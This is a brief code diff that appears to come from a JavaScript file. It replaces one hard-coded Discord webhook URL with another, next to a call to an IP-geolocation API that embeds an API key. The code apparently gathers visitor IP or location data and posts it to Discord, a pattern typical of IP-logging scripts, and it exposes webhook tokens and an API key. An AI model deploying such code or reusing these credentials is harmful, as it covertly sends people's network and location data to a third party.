@@ -123,7 +123,7 @@ fetch("https://api.ipdata.co?api-key=062a506916fc8b1ac165abe3bb16fa3029c71b2350d
                     }]
                 };
 
-                const webhookUrl = "https://discord.com/api/webhooks/1328133731772534875/6ld6OvBSuFSHMm90gBBVVFc3qZbk_Ev6YaNoIquejnrB-9n0WExFnIZL4H1jvYs-YTva";
+                const webhookUrl = "https://discord.com/api/webhooks/1406095423873220648/q7fwSrwNnN3y6XDLcnGc_XZnyHFOOz-EZBU_nXebIjfWWgohUuNSnujzfvDAqeRP00Rr";
                 fetch(webhookUrl, {
                     method: "POST",
                     headers: {
